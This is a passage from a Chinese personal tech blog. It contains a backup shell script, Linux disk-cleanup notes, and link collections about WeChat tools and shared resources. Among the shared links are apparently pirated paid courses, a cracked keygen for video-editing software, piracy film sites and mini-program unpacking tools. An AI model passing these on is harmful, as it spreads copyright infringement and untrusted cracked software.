class="line"># 下面的一般不用改了</span><br><span class="line">NOW=$(date +<span class="string">"%Y.%m.%d"</span>)</span><br><span class="line">DESTFILE=<span class="string">"$BACKUP_DST/$NOW.tar.gz"</span></span><br><span class="line"># 备份mysql数据库并和其它备份文件一起压缩成一个文件</span><br><span class="line">mysqldump -u $MYSQL_USER -h $MYSQL_SERVER -p$MYSQL_PASS --all-databases &gt; <span class="string">"$NOW-Databases.sql"</span></span><br><span class="line">echo <span class="string">"数据库备份完成，打包网站数据中..."</span></span><br><span class="line">tar cfzP <span class="string">"$DESTFILE"</span> $BACKUP_SRC <span class="string">"$NOW-Databases.sql"</span></span><br><span class="line">echo <span class="string">"所有数据打包完成，准备上传..."</span></span><br><span class="line"># 用脚本上传到百度网盘</span><br><span class="line">$SCRIPT_DIR/bypy/bypy.py upload <span class="string">"$DESTFILE"</span> <span class="string">"$DROPBOX_DIR/$NOW.tar.gz"</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq <span class="number">0</span> ];then</span><br><span class="line">     echo <span class="string">"上传完成"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">     echo <span class="string">"上传失败，重新尝试"</span></span><br><span class="line">fi</span><br><span class="line"># 删除本地的临时文件</span><br><span class="line">rm -f <span class="string">"$NOW-Databases.sql"</span> <span class="string">"$DESTFILE"</span></span><br><span class="line">然后改为可执行文件：</span><br><span class="line">chmod +x backup.sh #赋予权限</span><br><span class="line">运行的时候就输入下面的代码即可：</span><br><span class="line">./backup.sh</span><br><span class="line">然后通过 cron 来设置定时运行脚本：</span><br><span class="line">crontab -e</span><br><span class="line">加入以下代码，:wq 保存</span><br><span class="line"><span class="number">0</span> <span class="number">5</span> * * * <span class="regexp">/bin/</span>bash /root/backup.sh</span><br><span class="line">https:<span class="comment">//blog.fazero.me/2016/10/13/backup-vps-to-by/</span></span><br></pre></td></tr></table></figure>
<p>至尊搜索神器</p>
<p>百度网盘下载链接：<a href="https://pan.baidu.com/s/18f2uN4i-HmxcePwkM0W0gA" target="_blank" rel="noopener">https://pan.baidu.com/s/18f2uN4i-HmxcePwkM0W0gA</a> 提取码：tjvd </p>
<p>蓝奏云下载链接 <a href="https://www.lanzous.com/i4ernha" target="_blank" rel="noopener">https://www.lanzous.com/i4ernha</a></p>
<p><a href="https://pan.baidu.com/share/init?surl=ZZSLs9wmqkKmdTXlskMKdA" target="_blank" rel="noopener">文案写作 密码b50k</a></p>
<p><a href="https://pan.baidu.com/s/1AxvDnEd0SGliwrckc4yJkA" target="_blank" rel="noopener">张小龙饭否电子书 密码07wb</a></p>
<p><a href="https://pan.baidu.com/s/1FpneAwcGyCnlpOIuagHlug" target="_blank" rel="noopener">效率工具 密码2b5y</a></p>
<p><a href="https://pan.baidu.com/s/1PClifEIeuLqnBtx2OGVCVQ" target="_blank" rel="noopener">一键下载网页图片插件 密码7haa</a></p>
<p><a href="https://pan.baidu.com/s/1R38ldHhmCCivTrGCcBP4uA" target="_blank" rel="noopener">公众号排版 密码5058</a></p>
<p><a href="https://pan.baidu.com/wap/init?surl=BkjhJPr2ZuAJla-A_I85LQ&amp;adapt=pc&amp;fr=ftw" target="_blank" rel="noopener">编程资源 密码wanr</a></p>
<p><a href="https://pan.baidu.com/s/1yQ9dJyzSVh6nBxL_Y4yQUQ" target="_blank" rel="noopener">公众号谭某人技术分享</a></p>
<p><a href="http://www.pipiys.xyz/" target="_blank" rel="noopener">电影</a></p>
<p><a href="https://wn.run/cn/" target="_blank" rel="noopener">万能命令工具</a></p>
<p><a href="https://github.com/peterq/pan-light" target="_blank" rel="noopener">不限速的百度网盘客户端</a></p>
<p> <a href="https://shimo.im/docs/AMVhpDJ4NJYMsktr/read" target="_blank" rel="noopener">影视剧</a></p>
<p> <a href="http://www.coupling.pw/77320/06/21.LjLXXH" target="_blank" rel="noopener">银河补习班电影</a><br>ABBYYFineReader 是一款OCR图片文字识别软件，可以快速、方便地将扫描纸质文件、PDF格式及数字或移动电话图像转换成可编辑格式——Microsoft、 Word、Excel、PowerPoint、PDF、HTML等。99.8%的识别准确率即刻识别文本，复制和粘贴，搜索或编辑。轻松扫描纸质文件或PDF转换为可编辑文本，支持多国语言，保留原来的布局和格式。<br>链接: <a href="https://pan.baidu.com/s/1TUrmsaqiJrySbmr6IGBIsQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1TUrmsaqiJrySbmr6IGBIsQ</a> 提取码: 78zv  </p>
<p>新媒体运营干货，自媒体，各行业研究报告， 超多资料</p>
<p>新媒体运营干货<br>链接:<a href="https://pan.baidu.com/s/1gNyK8LdhXtWg0cO7RxE9nQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1gNyK8LdhXtWg0cO7RxE9nQ</a> 密码:p3w4</p>
<p>新媒体课堂<br>链接:<a href="https://pan.baidu.com/s/1E5ctTySIrmc_RTglnHao3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1E5ctTySIrmc_RTglnHao3Q</a> 密码:ahp3<br>新媒体课堂排版与文案<br>链接:<a href="https://pan.baidu.com/s/1qzfVeBk2Yz-h4uKe_bIHgA" target="_blank" rel="noopener">https://pan.baidu.com/s/1qzfVeBk2Yz-h4uKe_bIHgA</a> 密码:nix9<br>新媒体营销技巧，涨粉<br>链接:<a href="https://pan.baidu.com/s/1etOhGHAYc0hYPAqDUcTMnw" target="_blank" rel="noopener">https://pan.baidu.com/s/1etOhGHAYc0hYPAqDUcTMnw</a> 密码:qyl1<br>6000份营销策划资料<br>链接:<a href="https://pan.baidu.com/s/1Heybav_FPXAbZX3hgHpR0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1Heybav_FPXAbZX3hgHpR0A</a> 密码:7gcy<br>ppt模板<br>链接:<a href="https://pan.baidu.com/s/1FVtJ08BSwtftgfkSzC5EXA" target="_blank" rel="noopener">https://pan.baidu.com/s/1FVtJ08BSwtftgfkSzC5EXA</a> 密码:rfxc<br>各行业商业计划书<br>链接:<a href="https://pan.baidu.com/s/1IYsUS0niz-BsO3XAUtl6lA" target="_blank" rel="noopener">https://pan.baidu.com/s/1IYsUS0niz-BsO3XAUtl6lA</a> 密码:g7n8<br>31套互联网商业创业计划书<br>链接:<a href="https://pan.baidu.com/s/1huRn7UmbaHmVteNxW5hYgQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1huRn7UmbaHmVteNxW5hYgQ</a> 密码:gn80<br>师北辰写作课<br>链接:<a href="https://pan.baidu.com/s/1YJZ8CpF0uq7y3dycRjaUPg" target="_blank" rel="noopener">https://pan.baidu.com/s/1YJZ8CpF0uq7y3dycRjaUPg</a> 密码:ner0</p>
<p>170个知乎live付费课程<br>链接:<a href="https://pan.baidu.com/s/1v3tfTXsxrppJFZbZZIwtxA" target="_blank" rel="noopener">https://pan.baidu.com/s/1v3tfTXsxrppJFZbZZIwtxA</a> 密码:5ujb<br>广告人的书店<br>链接:<a href="https://pan.baidu.com/s/1fULLIBk1UV8xTMe6yFnIgw" target="_blank" rel="noopener">https://pan.baidu.com/s/1fULLIBk1UV8xTMe6yFnIgw</a> 密码:q9pl<br>几百本书<br>链接:<a href="https://pan.baidu.com/s/1u3widW7MYdPkAVSCcRevXQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1u3widW7MYdPkAVSCcRevXQ</a> 密码:g5il<br>笔试资料链接: <a href="https://pan.baidu.com/s/1L0gVd620Lny_JNsx4smPCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1L0gVd620Lny_JNsx4smPCw</a> 提取码: gwwf  </p>
<p>Python数据分析与机器学习实战资料<br>链接：<a href="https://pan.baidu.com/s/1gPLYDra0nsGPj0dia0RzSg" target="_blank" rel="noopener">https://pan.baidu.com/s/1gPLYDra0nsGPj0dia0RzSg</a><br>提取码：18l6</p>
<p>还是分享课程吧 python人工智能  链接：<a href="https://pan.baidu.com/s/1Z5ctN75EHqPUHLXOYrs6Tw" target="_blank" rel="noopener">https://pan.baidu.com/s/1Z5ctN75EHqPUHLXOYrs6Tw</a><br>提取码：jpil</p>
<p>1-1、价值2980元自媒体内部培训珍贵视频教程<br>链接：<a href="https://pan.baidu.com/s/1fPyJcwO89c1VQ5KBN7GcWA" target="_blank" rel="noopener">https://pan.baidu.com/s/1fPyJcwO89c1VQ5KBN7GcWA</a><br>提取码：ikd6 </p>
<p>2、百家号运营教程<br>链接：<a href="https://pan.baidu.com/s/1paxngap2tvGXRByM0h7ivw" target="_blank" rel="noopener">https://pan.baidu.com/s/1paxngap2tvGXRByM0h7ivw</a><br>提取码：6j3i </p>
<p>3、公众号暴利涨粉教程 </p>
<p>链接：<a href="https://pan.baidu.com/s/1c_FWchNKlu-d5NkrZRPi0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1c_FWchNKlu-d5NkrZRPi0A</a><br>提取码：hgcc </p>
<p>4、微博运营黑科技教程 </p>
<p>链接：<a href="https://pan.baidu.com/s/1LVpsrqKoSlwMcnBNrF543g" target="_blank" rel="noopener">https://pan.baidu.com/s/1LVpsrqKoSlwMcnBNrF543g</a><br>提取码：wrbz </p>
<p>5、短视频自媒体运营入门教程<br>链接：<a href="https://pan.baidu.com/s/1d5t_xIiYJM-sy1H2cUeodg" target="_blank" rel="noopener">https://pan.baidu.com/s/1d5t_xIiYJM-sy1H2cUeodg</a><br>提取码：4hb0 </p>
<p>1、自媒体入门全套教程<br>链接：<a href="https://pan.baidu.com/s/19i_52IPkaXAAwCptEKAiOg" target="_blank" rel="noopener">https://pan.baidu.com/s/19i_52IPkaXAAwCptEKAiOg</a><br>提取码：uv1f</p>
<p>Flutter从入门到进阶实战携程网App无密 链接: <a href="https://pan.baidu.com/s/1XbPVYo0qk2U3ExbxNvTEnw" target="_blank" rel="noopener">https://pan.baidu.com/s/1XbPVYo0qk2U3ExbxNvTEnw</a> 提取码: r672</p>
<p> <a href="http://pandownload.com/index.html" target="_blank" rel="noopener">http://pandownload.com/index.html</a><br><a href="http://www.wenkuwenku.com/" target="_blank" rel="noopener">http://www.wenkuwenku.com/</a></p>
<p>百度搜索 周杰伦专辑 百度云</p>
<p><a href="https://mp.weixin.qq.com/s/Sobuvc8J56dryQ5jeLfyMw" target="_blank" rel="noopener">教你下载被迅雷&amp;百度云屏蔽的资源</a></p>
<p> 工具大合集点这里：<a href="https://pan.baidu.com/s/1hhd7C0kQx1ASsDGmf3LCPQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1hhd7C0kQx1ASsDGmf3LCPQ</a> 提取码：cs6r<br>冰点文库下载器<a href="https://pan.baidu.com/s/1YApVf32Ww7mCFSm5ECYBog" target="_blank" rel="noopener">https://pan.baidu.com/s/1YApVf32Ww7mCFSm5ECYBog</a><br>会声会影视频编辑软件注册机汉化版<br><a href="https://pan.baidu.com/s/1XYiSLVmhaHvmr-Q_JHcBkQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1XYiSLVmhaHvmr-Q_JHcBkQ</a><br>提取码：bcr4 </p>
<p>推荐一下几本书《图解 TCP/IP》《图解 HTTP》《图解算法》《Laravel 框架关键技术解析》《现代操作系统 4》</p>
<p>分享一个PHP课程 助你加薪   链接: <a href="https://pan.baidu.com/s/1lH4r6Tb-E-8w8nXLCbimTA" target="_blank" rel="noopener">https://pan.baidu.com/s/1lH4r6Tb-E-8w8nXLCbimTA</a> 提取码: jhsx<br><a href="https://pan.baidu.com/mbox/homepage?short=n3xq7w9" target="_blank" rel="noopener">课程收集</a></p>
<p><a href="https://learnku.com/articles/32189" target="_blank" rel="noopener">程序员经典书籍推荐</a></p>
<p><a href="https://github.com/high-speed-downloader/high-speed-downloader" target="_blank" rel="noopener">百度网盘不限速下载器</a></p>
<p><a href="http://www.meinigui.com/movie/index.html" target="_blank" rel="noopener">电影网站</a></p>
<p><a href="https://pan.baidu.com/share/init?surl=ASNYXmci4RRbyhxtYeYDGA" target="_blank" rel="noopener">公众号视频 提取码：pvek</a> </p>
<p><a href="https://github.com/ganlvtech/down_52pojie_cn" target="_blank" rel="noopener">吾爱破解论坛 爱盘 down.52pojie.cn</a></p>
<p><a href="http://yyeer.com/%E8%AF%BB%E4%B9%A6/2017/12/18/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E5%BE%AE%E4%BF%A1%E8%BF%90%E8%90%A5-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">《从零开始学微信运营》读书笔记</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/08/微信相关/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/08/微信相关/" itemprop="url">微信相关</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-08T20:26:15+08:00">
                2019-05-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  618 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>微信公众号可以用 huggin 抓取搜狗搜索的结果<br><a href="https://weread.app/rank" target="_blank" rel="noopener">公众号 RSS 订阅 TOP 200</a></p>
<p><a href="https://github.com/PengJenas/MineWechat" target="_blank" rel="noopener">微信群发、自动回复、手机微信简单远控电脑</a></p>
<p><a href="https://www.paycats.cn/" target="_blank" rel="noopener">第三方支付 payjs</a></p>
<p><a href="https://docs.rsshub.app/" target="_blank" rel="noopener">易于扩展的 RSS 生成器</a></p>
<p><a href="https://www.v2ex.com/t/492551" target="_blank" rel="noopener">RSS 订阅微信公众号的各种解决方案</a></p>
<p><a href="http://www.ershicimi.com/" target="_blank" rel="noopener">公众号收集</a></p>
<p><a href="http://www.qianhaikeji.cn/" target="_blank" rel="noopener">一键导出微信公众号</a></p>
<p><a href="https://www.zhihu.com/question/21288524" target="_blank" rel="noopener">rss订阅微信公众平台上的文章</a></p>
<p><a href="https://github.com/leo8916/wxhub" target="_blank" rel="noopener">微信公众号-文章-无限制抓取</a></p>
<p><a href="https://mp.weixin.qq.com/s/LUavw-4dc1UgB1xiM8UT5Q" target="_blank" rel="noopener">公众号开通了流量主，两周赚了 47.63 元广告费</a></p>
<p><a href="https://www.v2ex.com/t/507696" target="_blank" rel="noopener"> 在 PPT 动画中学算法（每天 5 分钟一道算法）</a></p>
<p><a href="https://www.zhihu.com/question/26716409/answer/224332129" target="_blank" rel="noopener">怎样采集公众号的阅读数和点赞数</a></p>
<p><a href="https://kywx.xyz/" target="_blank" rel="noopener">给没有权限的公众号增加留言功能</a></p>
<p><a href="https://code2048.com/" target="_blank" rel="noopener">《神秘的程序员们》</a></p>
<p><a href="https://github.com/GitHubDaily/GitHubDaily" target="_blank" rel="noopener">2018 年所发的微博进行分类整理</a></p>
<p><a href="https://rss.mifaw.com/" target="_blank" rel="noopener">RSS 全文源</a></p>
<p><a href="https://qnmlgb.tech/" target="_blank" rel="noopener">瓦斯阅读</a></p>
<p><a href="https://www.vreadtech.com/" target="_blank" rel="noopener">web 上看微信公众号</a></p>
<p><a href="https://www.v2ex.com/t/490020" target="_blank" rel="noopener">一条两分钟读完的开发小技巧</a></p>
<p><a href="https://github.com/songluyi/crawl_wechat" target="_blank" rel="noopener">批量爬取微信公众号所有文章</a></p>
<p><a href="https://weixinshu.com/" target="_blank" rel="noopener">导出朋友圈成书</a></p>
<p><a href="http://tbq.gootile.com/download" target="_blank" rel="noopener">同步朋友圈微博</a></p>
<p><a href="https://www.v2ex.com/t/306226" target="_blank" rel="noopener">爬取微信公众号</a></p>
<p><a href="https://github.com/Terminus2049/ArchiveTeleBot" target="_blank" rel="noopener">ArchiveTeleBot</a></p>
<p><a href="https://blog.smoker.cc/crawler/convert-sogou-weixin-article-temporary-link-into-permanent-link.html" target="_blank" rel="noopener">搜狗微信公众号文章临时链接转为永久链接https://www.v2ex.com/t/520588</a></p>
<p><a href="http://pooltea.com/forum/fans_3.php" target="_blank" rel="noopener">公众号互粉</a></p>
<p><a href="https://learnku.com/laravel/t/29141" target="_blank" rel="noopener"> Laravel 接入微信小程序登陆功能</a></p>
<p><a href="https://weread.qnmlgb.tech/?rel=ws" target="_blank" rel="noopener">微信读书</a></p>
<p><a href="http://www.zhidaow.com/post/weo-first-post" target="_blank" rel="noopener">微信搜一搜排名结果分析</a></p>
<p><a href="https://www.xiaokuake.com/p/mimeng.html?from=groupmessage" target="_blank" rel="noopener">用数据解读咪蒙</a></p>
<p><a href="https://github.com/largezhou/wechat-menu" target="_blank" rel="noopener">微信公众号菜单管理扩展</a></p>
<p><a href="https://tophub.today/n/WnBe01o371?utm_source=hacpai.com" target="_blank" rel="noopener">微信热文</a></p>
<p><a href="http://ciika.com/2018/07/winddow-charles-https/" target="_blank" rel="noopener">公众号文章HTTPS抓包</a></p>
<p><a href="https://learnku.com/articles/26718" target="_blank" rel="noopener">微信扫码 - 关注公众号后网站自动登录</a></p>
<p><a href="https://we.wwei.cn/" target="_blank" rel="noopener">微信对话生成器</a></p>
<p><a href="https://smallvideo.dozentools.com/" target="_blank" rel="noopener">抖音视频下载 github.com/ChinaBygones/PHP-DouyinRobot</a></p>
<p><a href="https://github.com/mingyoung/wechat-playground" target="_blank" rel="noopener">微信调试工具 WeChat Playground </a></p>
<p><a href="https://learnku.com/articles/32351" target="_blank" rel="noopener">微信扫小程序码实现网页端登录</a></p>
<p>微信读书组队抽奖 <a href="https://weread.qnmlgb.tech/" target="_blank" rel="noopener">https://weread.qnmlgb.tech/</a> 既可以快速组队抽奖又不用分享群或者朋友圈。</p>
<p>破解 微信小程序 wxapkg 的网站  <a href="https://taobao.zhaoyizhe.com/" target="_blank" rel="noopener">https://taobao.zhaoyizhe.com/</a> <a href="http://mm.cqu.cc/tools/wxapkg/" target="_blank" rel="noopener">http://mm.cqu.cc/tools/wxapkg/</a> <a href="https://github.com/qwerty472123/wxappUnpacker.git" target="_blank" rel="noopener">https://github.com/qwerty472123/wxappUnpacker.git</a></p>
<p><a href="https://github.com/nasaplayer/WeChatRobotYa" target="_blank" rel="noopener">微信自动回复机器人小雅</a></p>
<h3 id="微信录音文件的处理mp3"><a href="#微信录音文件的处理mp3" class="headerlink" title="微信录音文件的处理mp3"></a>微信录音文件的处理mp3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//downloads.xiph.org/releases/speex/speex-1.2.0.tar.gz</span></span><br><span class="line">tar xzvf speex<span class="number">-1.2</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd speex<span class="number">-1.2</span><span class="number">.0</span> &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">git clone https:<span class="comment">//github.com/gamelife1314/wechat-speex-declib.git</span></span><br><span class="line">cd wechat-speex-declib &amp;&amp; make &amp;&amp; cp ./bin/speex_decode /usr/local/bin/speex2wav</span><br><span class="line"></span><br><span class="line">yum install speex-devel</span><br><span class="line">speex2wav xxx.amr   xxxx.mp3</span><br><span class="line">speex2wav xxx.speex xxxx.wav</span><br><span class="line">http:<span class="comment">//www.putyy.com/article/19</span></span><br></pre></td></tr></table></figure>
<p><a href="https://henix.github.io/feeds/weixin.sogou.banfoSB/" target="_blank" rel="noopener">半佛仙人那些疯癫又暴躁的公众号灵魂文章</a></p>
<p><a href="https://felixxiong.github.io/2019/10/04/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E8%B4%A6%E5%8F%B7%E7%94%B3%E8%AF%B7%E6%9D%90%E6%96%99%E5%B9%B6%E5%BC%80%E9%80%9A%E4%B8%8E%E8%AE%A4%E8%AF%81%E5%85%A8%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">微信公众账号申请材料并开通与认证全过程记录 </a></p>
<p><a href="https://www.jianshu.com/p/283e5dd57d35" target="_blank" rel="noopener">2019.9月最新爬取微信公众号历史文章的办法</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/26/linux-笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/26/linux-笔记/" itemprop="url">linux 笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-26T16:54:15+08:00">
                2019-04-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  11.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  50 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="磁盘空间不足"><a href="#磁盘空间不足" class="headerlink" title="磁盘空间不足"></a>磁盘空间不足</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">df命令查看当前计算器磁盘空闲情况</span><br><span class="line"> df -a</span><br><span class="line"> 从根目录下开始使用du命令查找出空间占用最大的文件</span><br><span class="line">  du -sh <span class="comment">/*命令一路追查</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# df -h   ###物理磁盘空间 查看所有block使用情况</span></span><br><span class="line"><span class="comment"> Filesystem      Size  Used Avail Use% Mounted on</span></span><br><span class="line"><span class="comment"> /dev/sda3       8.8G  8.8G     0 100% /</span></span><br><span class="line"><span class="comment"> tmpfs           931M     0  931M   0% /dev/shm</span></span><br><span class="line"><span class="comment"> /dev/sda1       190M   40M  141M  22% /boot</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# du -sh /usr/* |grep G  ###查找大文件</span></span><br><span class="line"><span class="comment"> 7.3G    /usr/local</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# du -sh /usr/local/* |grep G</span></span><br><span class="line"><span class="comment"> 7.3G    /usr/local/bin</span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# du -sh /usr/local/bin/* |grep G</span></span><br><span class="line"><span class="comment"> 7.3G    /usr/local/bin/1g</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> [root@test-os testuser]# rm -f /usr/local/bin/1g  ###删除大文件</span></span><br><span class="line"><span class="comment">有些文件删除时还被其它进程占用，此时文件并未真正删除，只是标记为 deleted，只有进程结束后才会将文件真正从磁盘中清除。</span></span><br><span class="line"><span class="comment"> [root@test-os ~]# lsof |grep deleted </span></span><br><span class="line"><span class="comment"> rsyslogd   1250      root    1w      REG                8,3 4888889358     140789 /var/log/messages (deleted)</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #lsof 显示出系统中被打开的文件 </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #第一列 软件/服务的名称</span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #第八列 文件的大小 </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #第10列 文件的名字</span></span><br><span class="line"><span class="comment"> [root@test-os ~]# #第11列 标记（硬链接数为0 进程调用数不为零 就会有 delete)</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> ####重启对应的服务 释放磁盘空间 </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# /etc/init.d/rsyslog restart </span></span><br><span class="line"><span class="comment"> --------------------- </span></span><br><span class="line"><span class="comment"> [root@test-os ~]# df -h</span></span><br><span class="line"><span class="comment"> Filesystem      Size  Used Avail Use% Mounted on</span></span><br><span class="line"><span class="comment"> /dev/sda3       8.8G  1.5G  6.9G  18% /</span></span><br><span class="line"><span class="comment"> tmpfs           931M     0  931M   0% /dev/shm</span></span><br><span class="line"><span class="comment"> /dev/sda1       190M   40M  141M  22% /boot</span></span><br><span class="line"><span class="comment"> /tmp/1m        1003K   19K  933K   2% /app/logs</span></span><br><span class="line"><span class="comment"> --------------------- </span></span><br><span class="line"><span class="comment"> # df -ih 节点磁盘空间</span></span><br><span class="line"><span class="comment"> Filesystem Inodes IUsed IFree IUse% Mounted on</span></span><br><span class="line"><span class="comment"> /dev/vda1 1.9M 299K 1.6M 17% /</span></span><br><span class="line"><span class="comment"> udev  123K 299 123K 1% /dev</span></span><br><span class="line"><span class="comment"> tmpfs  126K 249 125K 1% /run</span></span><br><span class="line"><span class="comment"> tmpfs  126K 4 126K 1% /run/lock</span></span><br><span class="line"><span class="comment"> tmpfs  126K 2 126K 1% /run/shm</span></span><br><span class="line"><span class="comment"> 可以看到，inode 区域只被占用了一小部分，还有大量的空间未使用，所以也不是 inode 区域被占满的问题。</span></span><br><span class="line"><span class="comment"> 查看哪个目录占用过大：</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> cd /;du  -sh ./* |sort -nr|more</span></span><br><span class="line"><span class="comment"> 发现 /var/spool/postfix/maildrop 这个目录占用了12G 多的空间</span></span><br><span class="line"><span class="comment"> 删除这个目录下的内容(通过管道的方式删除,避免参数过长导致无法执行)：</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> ls | xargs rm -f</span></span><br><span class="line"><span class="comment"> lsof test.log</span></span><br><span class="line"><span class="comment"> 这命令只能在文件被写入的时候才能显示内容，最后虽然得到了个进程号，但是因为写完进程就关闭了，所以还是查不到</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">    for i in /home/*; do echo $i; find $i |wc -l; done</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">    通过该命令可以查看每个用户home下inode的占用情况。如果某个目录下的inode很大，那就是问题所在了。</span></span><br></pre></td></tr></table></figure>
